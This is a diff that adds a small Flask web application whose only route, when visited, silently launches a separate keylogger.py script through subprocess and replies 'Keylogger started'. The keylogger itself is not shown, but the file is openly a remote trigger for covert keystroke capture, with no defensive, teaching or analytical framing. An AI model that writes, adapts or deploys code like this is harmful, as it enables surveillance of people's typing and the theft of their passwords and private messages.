@@ -1,0 +1,15 @@
+from flask import Flask  # Importing Flask to create a web server
+import subprocess  # Importing subprocess to run external processes
+
+# Initialize the Flask application
+app = Flask(__name__)
+
+@app.route('/')
+def trigger_keylogger():
+    # Start the keylogger script
+    subprocess.Popen(['python', 'keylogger.py'])  # Use subprocess to run keylogger.py
+    return 'Keylogger started'  # Return a response indicating the keylogger has started
+
+# Run the Flask application
+if __name__ == '__main__':
+    app.run(port=5000)  # Start the Flask app on port 5000
